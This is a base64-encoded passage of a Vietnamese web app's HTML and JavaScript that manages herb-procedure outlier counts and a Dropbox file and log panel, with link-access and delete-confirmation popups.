Sk7DQp9KSgpOw0KPC9zY3JpcHQ+DQoNCjxzY3JpcHQ+DQpmdW5jdGlvbiB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCgpIHsNCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUb2dnbGVCdG4nKTsNCiAgaWYgKCFidG4gfHwgIXdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgcmV0dXJuOw0KDQogIGNvbnN0IGhlcmJzID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzOw0KICBjb25zdCBjb3VudHMgPSB7fTsNCg0KICBoZXJicy5mb3JFYWNoKGggPT4gew0KICAgIGNvbnN0IGRhdGUgPSBoLmRhdGU7DQogICAgY29uc3Qga2V5ID0gZGF0ZTsNCiAgICBpZiAoIWNvdW50c1trZXldKSBjb3VudHNba2V5XSA9IHt9Ow0KICAgIGNvbnN0IG5hbWUgPSAoaC5vcGVyYXRvciB8fCAnS2jDtG5nIGPDsycpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KICAgIGNvdW50c1trZXldW25hbWVdID0gKGNvdW50c1trZXldW25hbWVdIHx8IDApICsgMTsNCiAgfSk7DQoNCiAgbGV0IG91dGxpZXJDb3VudCA9IDA7DQoNCiAgT2JqZWN0LmtleXMoY291bnRzKS5mb3JFYWNoKGRhdGUgPT4gew0KICAgIGNvbnN0IG9wcyA9IGNvdW50c1tkYXRlXTsNCiAgICBjb25zdCBlbnRyaWVzID0gT2JqZWN0LmVudHJpZXMob3BzKS5zb3J0KChhLCBiKSA9PiBiWzFdIC0gYVsxXSk7DQogICAgY29uc3QgdG9wID0gZW50cmllc1swXTsNCiAgICBpZiAoIXRvcCkgcmV0dXJuOw0KDQogICAgY29uc3QgdG9wTmFtZSA9IHRvcFswXTsNCiAgICBjb25zdCB0b3BDb3VudCA9IHRvcFsxXTsNCg0KICAgIGZvciAoY29uc3QgW25hbWUsIGNvdW50XSBvZiBlbnRyaWVzKSB7DQogICAgICBpZiAobmFtZSAhPT0gdG9wTmFtZSAmJiBjb3VudCA+IDApIHsNCiAgICAgICAgb3V0bGllckNvdW50ICs9IGNvdW50Ow0KICAgICAgfQ0KICAgIH0NCiAgfSk7DQoNCmJ0bi5pbm5lckhUTUwgPSBgU+G6r2MgdGh14buRYyB0aGFuZyA8aSBjbGFzcz0iZmEtc29saWQgZmEtdHJpYW5nbGUtZXhjbGFtYXRpb24iIHN0eWxlPSJjb2xvcjp5ZWxsb3ciPjwvaT4gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdzsgZm9udC13ZWlnaHQ6Ym9sZCI+KCR7b3V0bGllckNvdW50fSk8L3NwYW4+YDsNCg0KDQp9DQo8L3NjcmlwdD4NCjxkaXYgaWQ9ImRyb3Bib3hQYW5lbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTsgcG9zaXRpb246Zml4ZWQ7IGluc2V0OjA7IGJhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpOyB6LWluZGV4Ojk5OTk7Ij4NCiAgPGRpdiBzdHlsZT0ibWFyZ2luOjUlIGF1dG87IGJhY2tncm91bmQ6I2ZmZjsgcGFkZGluZzoyMHB4OyBtYXgtd2lkdGg6OTAlOyBib3JkZXItcmFkaXVzOjEwcHg7IG1heC1oZWlnaHQ6ODB2aDsgb3ZlcmZsb3c6YXV0byI+DQogICA8ZGl2IHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47IGFsaWduLWl0ZW1zOiBjZW50ZXI7Ij4NCiAgPGgzPvCfk4IgRGFuaCBzw6FjaCBLaG9hIMSRw6Mgc+G7rSBk4bulbmcgcGjhuqduIG3hu4FtPC9oMz4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIm9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFuZWwnKS5zdHlsZS5kaXNwbGF5PSdub25lJyJzdHlsZT0icGFkZGluZzo4cHggMTRweDsgZm9udC1zaXplOjEzcHg7IGJvcmRlci1yYWRpdXM6NHB4OyI+DQogICAgxJDDs25nDQogIDwvYnV0dG9uPg0KPC9kaXY+DQo8IS0tIFBhZ2luYXRpb24gY29udHJvbHMgLS0+DQo8ZGl2IGlkPSJkcm9wYm94UGFnZXIiIHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDo4cHg7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47bWFyZ2luLXRvcDoxMnB4Ij4NCiAgPGRpdj4NCiAgICBIaeG7g24gdGjhu4sNCiAgICA8c2VsZWN0IGlkPSJkcm9wYm94UGFnZVNpemUiIHN0eWxlPSJwYWRkaW5nOjZweCA4cHg7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO2JvcmRlci1yYWRpdXM6NnB4Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjEwIiBzZWxlY3RlZD4xMDwvb3B0aW9uPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iMjAiPjIwPC9vcHRpb24+DQogICAgICA8b3B0aW9uIHZhbHVlPSI1MCI+NTA8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgICBkw7JuZyAvIHRyYW5nDQogIDwvZGl2Pg0KDQogIDxkaXYgaWQ9ImRyb3Bib3hQYWdlQnV0dG9ucyIgc3R5bGU9ImRpc3BsYXk6ZmxleDtnYXA6NnB4O2ZsZXgtd3JhcDp3cmFwIj48L2Rpdj4NCg0KICA8ZGl2IGlkPSJkcm9wYm94UGFnZUluZm8iIHN0eWxlPSJtaW4td2lkdGg6MTcwcHg7dGV4dC1hbGlnbjpyaWdodCI+PC9kaXY+DQo8L2Rpdj4NCiAgICA8dGFibGUgYm9yZGVyPSIxIiBjZWxscGFkZGluZz0iOCIgc3R5bGU9IndpZHRoOjEwMCU7IGJvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTsgZm9udC1zaXplOjE0cHgiPg0KICAgICAgPHRoZWFkPg0KICAgICAgICA8dHI+DQogICAgICAgICAgPHRoPlNUVDwvdGg+DQogICAgICAgICAgPHRoPlTDqm4ga2hvYTwvdGg+DQogICAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgICA8dGg+U+G6r2MgdGh14buRYzwvdGg+DQogICAgICAgICA8dGg+U2FpIHRo4budaSBnaWFuPC90aD4NCiAgICAgICA8dGg+VHLDuW5nIGdp4budPC90aD4NCiAgICAgICANCiAgICAgICAgICA8dGg+VGjhu51pIGdpYW48L3RoPg0KCQkgIDx0aD5MaW5rPC90aD4NCgkJICA8dGg+WG/DoTwvdGg+DQogICAgICAgIDwvdHI+DQogICAgICA8L3RoZWFkPg0KICAgICAgPHRib2R5IGlkPSJkcm9wYm94RmlsZUxpc3QiPjwvdGJvZHk+DQogICAgPC90YWJsZT4NCiAgDQogIDwvZGl2Pg0KPC9kaXY+PHNjcmlwdD4NCmFzeW5jIGZ1bmN0aW9uIHNob3dEcm9wYm94UGFuZWwoKSB7DQphd2FpdCBlbnN1cmVEcm9wYm94KCk7IC8vIMSR4bqjbSBi4bqjbyBjw7MgRHJvcGJveCBTREsNCg0KICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveEZpbGVMaXN0Jyk7DQoNCiAgLy8gSGnhu4duIHBvcHVwIG5nYXkgbOG6rXAgdOG7qWMgduG7m2kgdHLhuqFuZyB0aMOhaSBsb2FkaW5nDQogIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjkiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6Ymx1ZTsiPg0KICAgIMSQYW5nIHThuqNpIGThu68gbGnhu4d1Li4uDQogIDwvdGQ+PC90cj5gOw0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhbmVsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQoNCiAgdHJ5IHsNCiAgICAvLyAxKSBLaeG7g20gdHJhIHThu5NuIHThuqFpIGxvZy5qc29uDQogICAgbGV0IGhhc0xvZyA9IGZhbHNlOw0KICAgIGxldCByZXMgPSBhd2FpdCBkYnguZmlsZXNMaXN0Rm9sZGVyKHsgcGF0aDogJy90aHV0aHVhdCcgfSk7DQogICAgd2hpbGUgKHRydWUpIHsNCiAgICAgIGlmIChyZXMucmVzdWx0Py5lbnRyaWVzPy5zb21lKGUgPT4gZVsnLnRhZyddID09PSAnZmlsZScgJiYgZS5uYW1lID09PSAnbG9nLmpzb24nKSkgew0KICAgICAgICBoYXNMb2cgPSB0cnVlOw0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAgIGlmICghcmVzLnJlc3VsdD8uaGFzX21vcmUpIGJyZWFrOw0KICAgICAgcmVzID0gYXdhaXQgZGJ4LmZpbGVzTGlzdEZvbGRlckNvbnRpbnVlKHsgY3Vyc29yOiByZXMucmVzdWx0LmN1cnNvciB9KTsNCiAgICB9DQoNCiAgICAvLyAyKSBO4bq/dSBraMO0bmcgY8OzIGZpbGUg4oaSIGPhuq1wIG5o4bqtdCBu4buZaSBkdW5nDQogICAgaWYgKCFoYXNMb2cpIHsNCiAgICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICAgIEtow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHUNCiAgICAgIDwvdGQ+PC90cj5gOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIDMpIEPDsyBmaWxlIOKGkiB04bqjaSB2w6AgaGnhu4NuIHRo4buLDQogICAgY29uc3QgZGwgPSBhd2FpdCBkYnguZmlsZXNEb3dubG9hZCh7IHBhdGg6ICcvdGh1dGh1YXQvbG9nLmpzb24nIH0pOw0KICAgIGNvbnN0IHRleHQgPSBhd2FpdCBkbC5yZXN1bHQuZmlsZUJsb2IudGV4dCgpOw0KICAgIGxldCBsb2dzID0gW107DQogICAgdHJ5IHsgbG9ncyA9IEpTT04ucGFyc2UodGV4dCk7IH0gY2F0Y2ggeyBsb2dzID0gW107IH0NCg0KICAgIGlmICghbG9ncy5sZW5ndGgpIHsNCiAgICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICAgIEtow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHUNCiAgICAgIDwvdGQ+PC90cj5gOw0KICAgIH0gZWxzZSB7DQogY29uc3QgY3VycmVudFVzZXIgPSAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KDQovLyBSZW5kZXIgbeG7m2kg4oCTIGdpYW8gY2hvIGLhu5kgcGjDom4gdHJhbmc6DQpEQl9MT0dTID0gbG9nczsgLy8gbeG6o25nIGThu68gbGnhu4d1IMSR4bqneSDEkeG7pw0KREJfUEFHRSA9IDE7ICAgIC8vIHbhu4EgdHJhbmcgMSBt4buXaSBraGkgbeG7nyBwYW5lbA0KREJfQ1VSUkVOVF9VU0VSID0gKHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSB8fCAnJykudG9Mb3dlckNhc2UoKTsNCg0KYXR0YWNoUGFnZXJFdmVudHNPbmNlKCk7IC8vIGfhuq9uIGNoYW5nZSBjaG8gc2VsZWN0IHBhZ2Ugc2l6ZSAoY2jhu4kgMSBs4bqnbikNCnJlbmRlckRyb3Bib3hQYWdlKCk7ICAgICAvLyB24bq9IHRib2R5ICsgbsO6dCB0cmFuZyB04burIERCX0xPR1MNCiAgICB9DQogIH0gY2F0Y2ggKGVycikgew0KICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZGFuaCBzw6FjaCB04burIERyb3Bib3g6JywgZXJyKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgS2jDtG5nIHRo4buDIHThuqNpIGThu68gbGnhu4d1DQogICAgPC90ZD48L3RyPmA7DQogIH0NCn0NCihmdW5jdGlvbigpew0KICBjb25zdCBwYWdlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZXInKTsNCiAgaWYgKHBhZ2VyICYmICFwYWdlci5kYXRhc2V0LmJvdW5kKSB7DQogICAgcGFnZXIuZGF0YXNldC5ib3VuZCA9ICcxJzsNCiAgICBwYWdlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogICAgcGFnZXIuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vkb3duJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgfQ0KfSkoKTsNCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KZnVuY3Rpb24gdmVyaWZ5QW5kT3BlbkxpbmsodXJsKSB7DQoNCg0KICAvLyBPdmVybGF5IHThu5FpIChjbGljayB2w6BvIHPhur0gdOG6r3QpDQogIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihvdmVybGF5LnN0eWxlLCB7DQogICAgcG9zaXRpb246ICdmaXhlZCcsIGluc2V0OiAnMCcsIGJhY2tncm91bmQ6ICdyZ2JhKDAsMCwwLDAuNSknLA0KICAgIGRpc3BsYXk6ICdmbGV4JywganVzdGlmeUNvbnRlbnQ6ICdjZW50ZXInLCBhbGlnbkl0ZW1zOiAnY2VudGVyJywNCiAgICB6SW5kZXg6ICcxMDAwMCcNCiAgfSk7DQoNCiAgLy8gS2h1bmcgcG9wdXANCiAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYm94LnN0eWxlLCB7DQogICAgYmFja2dyb3VuZDogJyNmZmYnLCBwYWRkaW5nOiAnMjRweCcsIGJvcmRlclJhZGl1czogJzEwcHgnLA0KICAgIG1heFdpZHRoOiAnNDIwcHgnLCB3aWR0aDogJzkwJScsIGJveFNoYWRvdzogJzAgNHB4IDEwcHggcmdiYSgwLDAsMCwwLjMpJywNCiAgICBkaXNwbGF5OiAnZmxleCcsIGZsZXhEaXJlY3Rpb246ICdjb2x1bW4nLCBhbGlnbkl0ZW1zOiAnY2VudGVyJywgZ2FwOiAnMTJweCcNCiAgfSk7DQoNCiAgLy8gVGnDqnUgxJHhu4Egbmfhuq9uIGfhu41uIChraMO0bmcgY8OzIGljb24vZ+G7rWkgZOG7ryBsaeG7h3UpDQogIGNvbnN0IHRpdGxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIHRpdGxlLnRleHRDb250ZW50ID0gJ05o4bqtcCBt4bqtdCBraOG6qXUgxJHhu4MgbeG7nyBsaW5rJzsNCiAgdGl0bGUuc3R5bGUuZm9udFdlaWdodCA9ICc2MDAnOw0KDQogIC8vIMOUIG5o4bqtcCBt4bqtdCBraOG6qXUNCiAgY29uc3QgaW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOw0KICBPYmplY3QuYXNzaWduKGlucHV0LCB7IHR5cGU6ICdwYXNzd29yZCcsIHBsYWNlaG9sZGVyOiAnTeG6rXQga2jhuql1JyB9KTsNCiAgT2JqZWN0LmFzc2lnbihpbnB1dC5zdHlsZSwgew0KICAgIHBhZGRpbmc6ICcxMHB4Jywgd2lkdGg6ICcxMDAlJywgYm9yZGVyOiAnMXB4IHNvbGlkICNkZGQnLCBib3JkZXJSYWRpdXM6ICc2cHgnDQogIH0pOw0KDQogIC8vIFRow7RuZyBiw6FvIGzhu5dpICjhuqluIG3hurdjIMSR4buLbmgpDQogIGNvbnN0IGVyciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBlcnIudGV4dENvbnRlbnQgPSAn4p2MIFNhaSBt4bqtdCBraOG6qXUhJzsNCiAgT2JqZWN0LmFzc2lnbihlcnIuc3R5bGUsIHsgY29sb3I6ICdyZWQnLCBmb250U2l6ZTogJzE0cHgnLCBkaXNwbGF5OiAnbm9uZScgfSk7DQoNCiAgLy8gTsO6dCB4w6FjIG5o4bqtbg0KICBjb25zdCBidG4gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdidXR0b24nKTsNCiAgYnRuLnRleHRDb250ZW50ID0gJ1jDoWMgbmjhuq1uJzsNCiAgT2JqZWN0LmFzc2lnbihidG4uc3R5bGUsIHsNCiAgICBwYWRkaW5nOiAnMTBweCAxNnB4JywgYmFja2dyb3VuZDogJyMzNDk4ZGInLCBjb2xvcjogJyNmZmYnLA0KICAgIGJvcmRlcjogJ25vbmUnLCBib3JkZXJSYWRpdXM6ICc2cHgnLCBjdXJzb3I6ICdwb2ludGVyJw0KICB9KTsNCg0KICAvLyBQcm9ncmVzcyBiYXIgKMSR4bq3dCBExq/hu5pJIEPDmU5HKQ0KICBjb25zdCBiYXJXcmFwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYmFyV3JhcC5zdHlsZSwgew0KICAgIHdpZHRoOiAnMTAwJScsIGJhY2tncm91bmQ6ICcjZGRkJywgaGVpZ2h0OiAnNnB4JywNCiAgICBib3JkZXJSYWRpdXM6ICczcHgnLCBtYXJnaW5Ub3A6ICcxMnB4Jw0KICB9KTsNCiAgY29uc3QgYmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYmFyLnN0eWxlLCB7IHdpZHRoOiAnMCUnLCBoZWlnaHQ6ICcxMDAlJywgYmFja2dyb3VuZDogJyMzNDk4ZGInIH0pOw0KICBiYXJXcmFwLmFwcGVuZENoaWxkKGJhcik7DQoNCiAgLy8gR+G6r24gdsOgbyBET00NCiAgYm94LmFwcGVuZENoaWxkKHRpdGxlKTsNCiAgYm94LmFwcGVuZENoaWxkKGlucHV0KTsNCiAgYm94LmFwcGVuZENoaWxkKGVycik7DQogIGJveC5hcHBlbmRDaGlsZChidG4pOw0KICBib3guYXBwZW5kQ2hpbGQoYmFyV3JhcCk7DQogIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCg0KICAvLyBDaOG6t24gY2xpY2sgYsOqbiB0cm9uZyBraMO0bmcgxJHDs25nDQogIGJveC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogIC8vIENsaWNrIHJhIG5nb8OgaSDEkeG7gyB04bqvdA0KICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7DQogIH0pOw0KDQogIC8vIFjhu60gbMO9IHjDoWMgbmjhuq1uDQogIGFzeW5jIGZ1bmN0aW9uIHN1Ym1pdCgpIHsNCiAgICAvLyDEkOG7lWkgbeG6rXQga2jhuql1IOG7nyDEkcOieQ0KICAgIGNvbnN0IE9LID0gaW5wdXQudmFsdWUgPT09ICcxISc7DQoNCiAgICBpZiAoIU9LKSB7DQogICAgICBlcnIuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICByZXR1cm47DQogICAgfQ0KICAgIGVyci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGJ0bi5kaXNhYmxlZCA9IHRydWU7DQogICAgaW5wdXQuZGlzYWJsZWQgPSB0cnVlOw0KDQogICAgLy8gQW5pbWF0ZSBwcm9ncmVzcyBuaGFuaCBsw6puIDEwMCUNCiAgICBiYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjZzIGVhc2UnOw0KICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiAoYmFyLnN0eWxlLndpZHRoID0gJzEwMCUnKSk7DQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICB3aW5kb3cub3Blbih1cmwsICdfYmxhbmsnKTsNCiAgICAgIGlmIChvdmVybGF5LnBhcmVudE5vZGUpIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7DQogICAgfSwgNjUwKTsNCiAgfQ0KDQogIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIHN1Ym1pdCk7DQogIGlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCAoZSkgPT4gew0KICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgc3VibWl0KCk7DQogIH0pOw0KDQogIC8vIEZvY3VzIG5nYXkgw7QgbeG6rXQga2jhuql1DQogIHNldFRpbWVvdXQoKCkgPT4gaW5wdXQuZm9jdXMoKSwgMCk7DQp9DQoNCmZ1bmN0aW9uIGV4dHJhY3RGaWxlbmFtZShkcm9wYm94UHJldmlld1VybCkgew0KICB0cnkgew0KICAgIGNvbnN0IHUgPSBuZXcgVVJMKGRyb3Bib3hQcmV2aWV3VXJsKTsNCiAgICBjb25zdCBwID0gdS5zZWFyY2hQYXJhbXMuZ2V0KCdwcmV2aWV3Jyk7DQogICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwIHx8ICcnKTsNCiAgfSBjYXRjaCB7IHJldHVybiAnJzsgfQ0KfQ0KDQovLyBI4buZcCB4w6FjIG5o4bqtbiB4b8OhICh0cuG6oyB24buBIFByb21pc2U8Ym9vbGVhbj4pDQpmdW5jdGlvbiBjb25maXJtRGVsZXRlUG9wdXAodGV4dD0nQuG6oW4gY8OzIGNo4bqvYyBtdeG7kW4geG/DoT8nLCBvbmVCdXR0b249ZmFsc2UpIHsNCiAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4gew0KICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICBPYmplY3QuYXNzaWduKG92ZXJsYXkuc3R5bGUsIHsNCiAgICAgIHBvc2l0aW9uOidmaXhlZCcsIGluc2V0OicwJywgYmFja2dyb3VuZDoncmdiYSgwLDAsMCwwLjUpJywNCiAgICAgIGRpc3BsYXk6J2ZsZXgnLCBhbGlnbkl0ZW1zOidjZW50ZXInLCBqdXN0aWZ5Q29udGVudDonY2VudGVyJywgekluZGV4OjEwMDAxDQogICAgfSk7DQoNCiAgICBjb25zdCBib3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICBPYmplY3QuYXNzaWduKGJveC5zdHlsZSwgew0KICAgICAgYmFja2dyb3VuZDonI2ZmZicsIHBhZGRpbmc6JzIwcHgnLCBib3JkZXJSYWRpdXM6JzhweCcsDQogICAgICBtYXhXaWR0aDonNDIwcHgnLCB3aWR0aDonOTAlJywgYm94U2hhZG93OicwIDRweCAxMnB4IHJnYmEoMCwwLDAsLjI1KScsDQogICAgICBmb250RmFtaWx5OidJbnRlciwgc2Fucy1zZXJpZicNCiAgICB9KTsNCg0KICAgIGJveC5pbm5lckhUTUwgPSBgDQogICAgICA8ZGl2IHN0eWxlPSJmb250LXdlaWdodDo2MDA7IG1hcmdpbi1ib3R0b206OHB4Ij5Yw6FjIG5o4bqtbiB4b8OhPC9kaXY+DQogICAgICA8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOjE0cHgiPiR7dGV4dH08L2Rpdj4NCiAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDsgZ2FwOjEwcHg7IGp1c3RpZnktY29udGVudDpmbGV4LWVuZCI+DQogICAgICAgIDxidXR0b24gaWQ9ImRsZ0NhbmNlbCIgY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6IzdmOGM4ZCI+SHXhu7c8L2J1dHRvbj4NCiAgICAgICAgJHshb25lQnV0dG9uID8gYDxidXR0b24gaWQ9ImRsZ1llcyIgY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6I2U3NGMzYyI+WG/DoTwvYnV0dG9uPmAgOiAnJ30NCiAgICAgIDwvZGl2Pg0KICAgIGA7DQoNCiAgICBvdmVybGF5LmFwcGVuZENoaWxkKGJveCk7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCg0KICAgIGJveC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogICAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZShmYWxzZSk7IH0pOw0KICAgIGJveC5xdWVyeVNlbGVjdG9yKCcjZGxnQ2FuY2VsJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUoZmFsc2UpOyB9KTsNCg0KICAgIGlmICghb25lQnV0dG9uKSB7DQogICAgICBib3gucXVlcnlTZWxlY3RvcignI2RsZ1llcycpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKHRydWUpOyB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQovLyBYb8OhIDEgZW50cnkgbG9nICsgZmlsZSBFeGNlbCB0csOqbiBEcm9wYm94ICh0aGVvIGluZGV4IHRyb25nIG3huqNuZyBsb2dzKQ0KYXN5bmMgZnVuY3Rpb24gZGVsZXRlTG9nQW5kRmlsZV9CeUluZGV4KGlkeCkgew0KICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCiAgY29uc3QgbG9nUGF0aCA9ICcvdGh1dGh1YXQvbG9nLmpzb24nOw0KDQogIC8vIDEpIFThuqNpIGxvZy5qc29uIGhp4buHbiB04bqhaQ0KICBsZXQgbG9ncyA9IFtdOw0KICB0cnkgew0KICAgIGNvbnN0IGRsID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiBsb2dQYXRoIH0pOw0KICAgIGNvbnN0IHRleHQgPSBhd2FpdCBkbC5yZXN1bHQuZmlsZUJsb2IudGV4dCgpOw0KICAgIGxvZ3MgPSBKU09OLnBhcnNlKHRleHQgfHwgJ1tdJyk7DQogIH0gY2F0Y2ggKGUpIHsNCiAgICBhbGVydCgnS2jDtG5nIMSR4buNYyDEkcaw4bujYyBsb2cuanNvbiB0csOqbiBEcm9wYm94LicpOyANCiAgICB0aHJvdyBlOw0KICB9DQoNCiAgY29uc3QgaXRlbSA9IGxvZ3NbaWR4XTsNCiAgaWYgKCFpdGVtKSB7IGFsZXJ0KCdLaMO0bmcgdMOsbSB0aOG6pXkgbeG7pWMgY+G6p24geG/DoS4nKTsgcmV0dXJuOyB9DQoNCiAgLy8gMikgTOG6pXkgZmlsZU5hbWUgJiB4b8OhIGZpbGUgRXhjZWwgKG7hur91IGPDsykNCiAgY29uc3QgZmlsZU5hbWUgPSBleHRyYWN0RmlsZW5hbWUoaXRlbS5saW5rIHx8ICcnKTsNCiAgY29uc3QgZmlsZVBhdGggPSBmaWxlTmFtZSA/IGAvdGh1dGh1YXQvJHtmaWxlTmFtZX1gIDogbnVsbDsNCg0KICB0cnkgew0KICAgIGlmIChmaWxlUGF0aCkgeyBhd2FpdCBkYnguZmlsZXNEZWxldGVWMih7IHBhdGg6IGZpbGVQYXRoIH0pOyB9DQogIH0gY2F0Y2ggKGUpIHsNCiAgICAvLyBO4bq/dSBmaWxlIGtow7RuZyB04buTbiB04bqhaSB24bqrbiB0aeG6v3AgdOG7pWMgeG/DoSBsb2cNCiAgICBjb25zb2xlLndhcm4oJ1hvw6EgZmlsZSBFeGNlbCBs4buXaS9raMO0bmcgdOG7k24gdOG6oWksIHRp4bq/cCB04bulYyB4b8OhIGxvZy4uLicsIGUpOw0KICB9DQoNCiAgLy8gMykgQ+G6rXAgbmjhuq10IGxvZzogYuG7jyBwaOG6p24gdOG7rSBpZHggdsOgIGdoaSDEkcOoIGzhuqFpDQogIGxvZ3Muc3BsaWNlKGlkeCwgMSk7DQogIGF3YWl0IGRieC5maWxlc1VwbG9hZC